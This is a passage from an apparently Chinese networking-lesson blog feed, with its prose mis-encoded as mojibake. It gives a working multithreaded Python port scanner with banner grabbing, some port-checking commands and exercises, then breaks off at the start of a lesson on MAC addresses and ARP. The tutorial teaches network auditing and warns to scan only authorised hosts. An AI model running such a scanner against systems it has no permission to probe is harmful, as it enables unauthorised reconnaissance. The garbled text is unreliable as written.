class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;â³ è¯·ç¨å€™...\n&quot;</span>)<br><br>        open_ports = []<br>        total_ports = end_port - start_port + <span class="hljs-number">1</span><br>        scanned = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘æ‰«æ</span><br>        <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>            <span class="hljs-comment"># æäº¤æ‰€æœ‰æ‰«æä»»åŠ¡</span><br>            futures = &#123;<br>                executor.submit(<span class="hljs-variable language_">self</span>.scan_port, host, port, timeout): port<br>                <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start_port, end_port + <span class="hljs-number">1</span>)<br>            &#125;<br><br>            <span class="hljs-comment"># å¤„ç†å®Œæˆçš„ä»»åŠ¡</span><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>                scanned += <span class="hljs-number">1</span><br>                port_num, is_open, service = future.result()<br><br>                <span class="hljs-keyword">if</span> is_open:<br>                    open_ports.append((port_num, service))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… ç«¯å£ <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> å¼€æ”¾ - <span class="hljs-subst">&#123;service&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">elif</span> show_closed:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ ç«¯å£ <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> å…³é—­&quot;</span>)<br><br>                <span class="hljs-comment"># æ˜¾ç¤ºè¿›åº¦</span><br>                <span class="hljs-keyword">if</span> scanned % <span class="hljs-number">50</span> == <span class="hljs-number">0</span>:<br>                    progress = (scanned / total_ports) * <span class="hljs-number">100</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   è¿›åº¦: <span class="hljs-subst">&#123;progress:<span class="hljs-number">.1</span>f&#125;</span>% (<span class="hljs-subst">&#123;scanned&#125;</span>/<span class="hljs-subst">&#123;total_ports&#125;</span>)&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>        <span class="hljs-keyword">return</span> open_ports<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_common_ports</span>(<span class="hljs-params">self, host, timeout=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰«æå¸¸ç”¨ç«¯å£</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            host: ç›®æ ‡ä¸»æœº</span><br><span class="hljs-string">            timeout: è¶…æ—¶æ—¶é—´</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            å¼€æ”¾ç«¯å£åˆ—è¡¨</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ” æ­£åœ¨æ‰«æ <span class="hljs-subst">&#123;host&#125;</span> çš„å¸¸ç”¨ç«¯å£&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“‹ å…± <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.common_ports)&#125;</span> ä¸ªå¸¸ç”¨ç«¯å£\n&quot;</span>)<br><br>        open_ports = []<br><br>        <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:<br>            futures = &#123;<br>                executor.submit(<span class="hljs-variable language_">self</span>.scan_port_with_banner, host, port, timeout): port<br>                <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.common_ports.keys()<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>                port_num, is_open, service, banner = future.result()<br><br>                <span class="hljs-keyword">if</span> is_open:<br>                    open_ports.append((port_num, service, banner))<br>                    <span class="hljs-keyword">if</span> banner:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… ç«¯å£ <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> å¼€æ”¾ - <span class="hljs-subst">&#123;service:&lt;<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;banner&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… ç«¯å£ <span class="hljs-subst">&#123;port_num:&lt;<span class="hljs-number">6</span>&#125;</span> å¼€æ”¾ - <span class="hljs-subst">&#123;service&#125;</span>&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> open_ports<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">display_results</span>(<span class="hljs-params">self, host, open_ports</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ˜¾ç¤ºæ‰«æç»“æœ</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            host: ä¸»æœºåœ°å€</span><br><span class="hljs-string">            open_ports: å¼€æ”¾ç«¯å£åˆ—è¡¨</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ‰«æç»“æœ - <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">if</span> open_ports:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nå‘ç° <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(open_ports)&#125;</span> ä¸ªå¼€æ”¾ç«¯å£:\n&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;ç«¯å£&#x27;</span>:&lt;<span class="hljs-number">10</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;æœåŠ¡&#x27;</span>:&lt;<span class="hljs-number">20</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;å¤‡æ³¨&#x27;</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>            <span class="hljs-keyword">for</span> port_info <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(open_ports):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(port_info) == <span class="hljs-number">2</span>:<br>                    port, service = port_info<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;port:&lt;<span class="hljs-number">10</span>&#125;</span> <span class="hljs-subst">&#123;service:&lt;<span class="hljs-number">20</span>&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(port_info) == <span class="hljs-number">3</span>:<br>                    port, service, banner = port_info<br>                    banner_str = banner[:<span class="hljs-number">40</span>] <span class="hljs-keyword">if</span> banner <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;port:&lt;<span class="hljs-number">10</span>&#125;</span> <span class="hljs-subst">&#123;service:&lt;<span class="hljs-number">20</span>&#125;</span> <span class="hljs-subst">&#123;banner_str&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nâŒ æœªå‘ç°å¼€æ”¾ç«¯å£&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    scanner = PortScanner()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç«¯å£æ‰«æå™¨&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©æ‰«ææ¨¡å¼:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. æ‰«æå¸¸ç”¨ç«¯å£ï¼ˆæ¨èï¼‰&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. æ‰«æç«¯å£èŒƒå›´&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. æ‰«æå•ä¸ªç«¯å£&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. é€€å‡º&quot;</span>)<br><br>    choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥é€‰é¡¹: &quot;</span>).strip()<br><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå†è§ï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># è·å–ç›®æ ‡ä¸»æœº</span><br>    host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥ç›®æ ‡ä¸»æœºï¼ˆIPæˆ–åŸŸåï¼‰: &quot;</span>).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> host:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ ä¸»æœºä¸èƒ½ä¸ºç©º&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># éªŒè¯ä¸»æœºæ˜¯å¦å¯è¾¾</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ” æ­£åœ¨æ£€æŸ¥ä¸»æœº <span class="hljs-subst">&#123;host&#125;</span> æ˜¯å¦å¯è¾¾...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        socket.gethostbyname(host)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âœ… ä¸»æœºå¯è¾¾&quot;</span>)<br>    <span class="hljs-keyword">except</span> socket.gaierror:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ æ— æ³•è§£æä¸»æœºå&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>()<br>    start_time = time.time()<br><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        <span class="hljs-comment"># æ‰«æå¸¸ç”¨ç«¯å£</span><br>        open_ports = scanner.scan_common_ports(host)<br>        scanner.display_results(host, open_ports)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>        <span class="hljs-comment"># æ‰«æç«¯å£èŒƒå›´</span><br>        start_port = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥èµ·å§‹ç«¯å£: &quot;</span>).strip())<br>        end_port = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ç»“æŸç«¯å£: &quot;</span>).strip())<br><br>        <span class="hljs-keyword">if</span> start_port &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> end_port &gt; <span class="hljs-number">65535</span> <span class="hljs-keyword">or</span> start_port &gt; end_port:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ ç«¯å£èŒƒå›´æ— æ•ˆ&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        open_ports = scanner.scan_range(host, start_port, end_port)<br>        scanner.display_results(host, open_ports)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>        <span class="hljs-comment"># æ‰«æå•ä¸ªç«¯å£</span><br>        port = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥ç«¯å£å·: &quot;</span>).strip())<br><br>        <span class="hljs-keyword">if</span> port &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> port &gt; <span class="hljs-number">65535</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ ç«¯å£å·æ— æ•ˆ&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        port_num, is_open, service, banner = scanner.scan_port_with_banner(host, port)<br><br>        <span class="hljs-keyword">if</span> is_open:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâœ… ç«¯å£ <span class="hljs-subst">&#123;port&#125;</span> å¼€æ”¾&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æœåŠ¡: <span class="hljs-subst">&#123;service&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> banner:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   Banner: <span class="hljs-subst">&#123;banner&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâŒ ç«¯å£ <span class="hljs-subst">&#123;port&#125;</span> å…³é—­&quot;</span>)<br><br>    <span class="hljs-comment"># æ˜¾ç¤ºè€—æ—¶</span><br>    elapsed_time = time.time() - start_time<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâ±ï¸  æ‰«æè€—æ—¶: <span class="hljs-subst">&#123;elapsed_time:<span class="hljs-number">.2</span>f&#125;</span> ç§’&quot;</span>)<br><br>    <span class="hljs-comment"># å®‰å…¨æç¤º</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âš ï¸  å®‰å…¨æç¤º:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - ä»…æ‰«ææ‚¨æœ‰æƒé™æ‰«æçš„ä¸»æœº&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - æœªç»æˆæƒçš„ç«¯å£æ‰«æå¯èƒ½è¿æ³•&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - è¯·éµå®ˆç½‘ç»œå®‰å…¨æ³•å¾‹æ³•è§„&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day11/day11_port_scanner.py<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ä»£ç è¯¦è§£">ğŸ” ä»£ç è¯¦è§£</h2><h3 id="1-Socketè¿æ¥æµ‹è¯•">1. Socketè¿æ¥æµ‹è¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># connect_ex() æ–¹æ³•</span><br>result = sock.connect_ex((host, port))<br><br><span class="hljs-comment"># è¿”å›å€¼ï¼š</span><br><span class="hljs-comment"># 0 = è¿æ¥æˆåŠŸï¼ˆç«¯å£å¼€æ”¾ï¼‰</span><br><span class="hljs-comment"># å…¶ä»– = è¿æ¥å¤±è´¥ï¼ˆç«¯å£å…³é—­æˆ–è¢«è¿‡æ»¤ï¼‰</span><br></code></pre></td></tr></table></figure><h3 id="2-å¹¶å‘æ‰«ææé€Ÿ">2. å¹¶å‘æ‰«ææé€Ÿ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨çº¿ç¨‹æ± åŒæ—¶æ‰«æå¤šä¸ªç«¯å£</span><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># 100ä¸ªçº¿ç¨‹å¹¶å‘å·¥ä½œ</span><br>    futures = &#123;executor.submit(scan_port, host, port): port<br>               <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end)&#125;<br></code></pre></td></tr></table></figure><h3 id="3-BanneræŠ“å–">3. BanneræŠ“å–</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è¿æ¥æˆåŠŸåï¼Œå°è¯•æ¥æ”¶æœåŠ¡å™¨çš„å“åº”</span><br>sock.connect((host, port))<br>sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.0\r\n\r\n&#x27;</span>)  <span class="hljs-comment"># å‘é€HTTPè¯·æ±‚</span><br>banner = sock.recv(<span class="hljs-number">1024</span>)  <span class="hljs-comment"># æ¥æ”¶å“åº”</span><br><br><span class="hljs-comment"># Bannerå¯ä»¥å¸®åŠ©è¯†åˆ«æœåŠ¡ç±»å‹å’Œç‰ˆæœ¬</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><p>ä»Šå¤©å­¦ä¹ äº†ï¼š</p><ol><li>âœ… ç«¯å£æ˜¯ä¼ è¾“å±‚çš„æ¦‚å¿µï¼Œç”¨äºæ ‡è¯†åº”ç”¨ç¨‹åº</li><li>âœ… ç«¯å£å·èŒƒå›´ï¼š0-65535</li><li>âœ… Socketæ˜¯ç½‘ç»œç¼–ç¨‹çš„åŸºç¡€æ¥å£</li><li>âœ… TCP Socketé¢å‘è¿æ¥ï¼ŒUDP Socketæ— è¿æ¥</li><li>âœ… ç«¯å£æ‰«ææ˜¯ç½‘ç»œå®‰å…¨å®¡è®¡çš„é‡è¦æ‰‹æ®µ</li></ol><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><table><thead><tr><th>æ¦‚å¿µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ç«¯å£</td><td>16ä½æ•°å­—ï¼Œæ ‡è¯†åº”ç”¨ç¨‹åº</td></tr><tr><td>Socket</td><td>ç½‘ç»œç¼–ç¨‹æ¥å£</td></tr><tr><td>TCP Socket</td><td>é¢å‘è¿æ¥ï¼Œå¯é ä¼ è¾“</td></tr><tr><td>UDP Socket</td><td>æ— è¿æ¥ï¼Œå¿«é€Ÿä½†ä¸å¯é </td></tr><tr><td>ç«¯å£æ‰«æ</td><td>æ£€æµ‹ç«¯å£å¼€æ”¾çŠ¶æ€</td></tr></tbody></table><h3 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æœ¬æœºç›‘å¬çš„ç«¯å£</span><br>netstat -an | grep LISTEN    <span class="hljs-comment"># Linux/Mac</span><br>netstat -an | findstr LISTEN <span class="hljs-comment"># Windows</span><br><br><span class="hljs-comment"># æŸ¥çœ‹ç‰¹å®šç«¯å£</span><br>lsof -i :8080               <span class="hljs-comment"># Mac/Linux</span><br>netstat -ano | findstr :8080 <span class="hljs-comment"># Windows</span><br><br><span class="hljs-comment"># æµ‹è¯•ç«¯å£è¿é€šæ€§</span><br>telnet host port<br>nc -zv host port            <span class="hljs-comment"># Linux/Mac</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºç«¯å£">ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºç«¯å£</h3><ol><li>æŸ¥çœ‹æœ¬æœºæ­£åœ¨ç›‘å¬çš„æ‰€æœ‰ç«¯å£</li><li>æ‰¾å‡º80å’Œ443ç«¯å£çš„çŠ¶æ€</li><li>æŸ¥çœ‹å“ªäº›ç¨‹åºå ç”¨äº†ç«¯å£</li></ol><h3 id="ç»ƒä¹ 2ï¼šç†è§£Socket">ç»ƒä¹ 2ï¼šç†è§£Socket</h3><ol><li>ç”»å‡ºTCP Socketé€šä¿¡çš„å®Œæ•´æµç¨‹</li><li>è§£é‡ŠTCPä¸‰æ¬¡æ¡æ‰‹åœ¨Socketä¸­çš„ä½“ç°</li><li>è¯´æ˜æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„åŒºåˆ«</li></ol><h3 id="ç»ƒä¹ 3ï¼šç«¯å£æ‰«æ">ç»ƒä¹ 3ï¼šç«¯å£æ‰«æ</h3><ol><li>æ‰«ææœ¬æœºçš„å¸¸ç”¨ç«¯å£</li><li>æ‰«æå±€åŸŸç½‘ç½‘å…³çš„ç«¯å£</li><li>åˆ†ææ‰«æç»“æœï¼Œè¯†åˆ«è¿è¡Œçš„æœåŠ¡</li></ol><h3 id="ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•">ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•</h3><p>æ‰©å±•ç«¯å£æ‰«æå™¨ï¼š</p><ol><li>æ·»åŠ æ‰«æç»“æœä¿å­˜åŠŸèƒ½</li><li>å®ç°æœåŠ¡ç‰ˆæœ¬æ£€æµ‹</li><li>æ·»åŠ æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«</li><li>æ”¯æŒå¤šä¸»æœºæ‰¹é‡æ‰«æ</li></ol><h3 id="ç»ƒä¹ 5ï¼šå®‰å…¨æ€è€ƒ">ç»ƒä¹ 5ï¼šå®‰å…¨æ€è€ƒ</h3><ol><li>ä»€ä¹ˆæ˜¯ç«¯å£æ‰«æï¼Ÿåˆæ³•å—ï¼Ÿ</li><li>å¦‚ä½•é˜²å¾¡ç«¯å£æ‰«æï¼Ÿ</li><li>é˜²ç«å¢™å¦‚ä½•è¿‡æ»¤ç«¯å£ï¼Ÿ</li></ol><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šç«¯å£æ˜¯ç½‘ç»œä¸–ç•Œçš„å¤§é—¨ï¼ŒSocketæ˜¯æ‰“å¼€è¿™æ‰‡é—¨çš„é’¥åŒ™ï¼</p><p>ğŸ‘‰ <a href="day10.md">ä¸Šä¸€å¤©ï¼šMACåœ°å€å’ŒARP</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day12.md">ä¸‹ä¸€å¤©ï¼šDNSåè®®è¯¦è§£</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>10å¤©ï¼šMACåœ°å€å’ŒARPåè®®</title>
    <link href="/2025/11/10/10%E5%A4%A9%EF%BC%9AMAC%E5%9C%B0%E5%9D%80%E5%92%8CARP%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/10%E5%A4%A9%EF%BC%9AMAC%E5%9C%B0%E5%9D%80%E5%92%8CARP%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬10å¤©ï¼šMACåœ°å€å’ŒARPåè®®</h1><blockquote><p>â€œIPåœ°å€æ˜¯é€»è¾‘åœ°å€ï¼ŒMACåœ°å€æ˜¯ç‰©ç†åœ°å€ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£MACåœ°å€çš„æ¦‚å¿µå’Œæ ¼å¼</li><li>æŒæ¡MACåœ°å€å’ŒIPåœ°å€çš„åŒºåˆ«</li><li>ç†è§£ARPåè®®çš„å·¥ä½œåŸç†</li><li>å­¦ä¼šæŸ¥çœ‹å’Œç®¡ç†ARPç¼“å­˜</li><li>ç¼–å†™ARPæ‰«æå·¥å…·</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯MACåœ°å€ï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯MACåœ°å€ï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">MACåœ°å€ <span class="hljs-operator">=</span> èº«ä»½è¯å·<br><br>èº«ä»½è¯å·ï¼šç»ˆèº«ä¸å˜ï¼Œå”¯ä¸€æ ‡è¯†ä¸€ä¸ªäºº<br>MACåœ°å€ï¼šå‡ºå‚å›ºåŒ–ï¼Œå”¯ä¸€æ ‡è¯†ä¸€å—ç½‘å¡<br><br>IPåœ°å€ <span class="hljs-operator">=</span> å®¶åº­ä½å€<br><br>å®¶åº­ä½å€ï¼šå¯ä»¥æ¬å®¶æ›´æ¢<br>IPåœ°å€ï¼šå¯ä»¥æ›´æ¢ç½‘ç»œè€Œæ”¹å˜<br></code></pre></td></tr></table></figure><p><strong>MACåœ°å€</strong>ï¼ˆMedia Access Control Addressï¼Œåª’ä½“è®¿é—®æ§åˆ¶åœ°å€ï¼‰æ˜¯ç½‘å¡ï¼ˆç½‘ç»œæ¥å£å¡ï¼‰çš„ç‰©ç†åœ°å€ï¼Œç”¨äºåœ¨æ•°æ®é“¾è·¯å±‚æ ‡è¯†ç½‘ç»œè®¾å¤‡ã€‚</p><h3 id="MACåœ°å€çš„ç‰¹ç‚¹">MACåœ°å€çš„ç‰¹ç‚¹</h3><ol><li><strong>å…¨çƒå”¯ä¸€</strong>ï¼šç†è®ºä¸Šä¸–ç•Œä¸Šæ²¡æœ‰ä¸¤å—ç½‘å¡æœ‰ç›¸åŒçš„MACåœ°å€</li><li><strong>å›ºåŒ–åœ¨ç¡¬ä»¶</strong>ï¼šå‡ºå‚æ—¶å†™å…¥ROMï¼Œä¸€èˆ¬ä¸å¯æ›´æ”¹</li><li><strong>48ä½ï¼ˆ6å­—èŠ‚ï¼‰</strong>ï¼šé€šå¸¸ç”¨12ä½åå…­è¿›åˆ¶æ•°è¡¨ç¤º</li><li><strong>æ•°æ®é“¾è·¯å±‚</strong>ï¼šå·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬2å±‚</li></ol><h2 id="ğŸ“Š-MACåœ°å€æ ¼å¼">ğŸ“Š MACåœ°å€æ ¼å¼</h2><h3 id="æ ‡å‡†æ ¼å¼">æ ‡å‡†æ ¼å¼</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby">å¸¸è§è¡¨ç¤ºæ–¹æ³•ï¼š<br><br><span class="hljs-number">1</span>. å†’å·åˆ†éš”ï¼ˆ<span class="hljs-title class_">Linux</span>/<span class="hljs-title class_">Unix</span>ï¼‰<br>   <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:CC</span><span class="hljs-symbol">:DD</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:FF</span><br><br><span class="hljs-number">2</span>. æ¨ªçº¿åˆ†éš”ï¼ˆ<span class="hljs-title 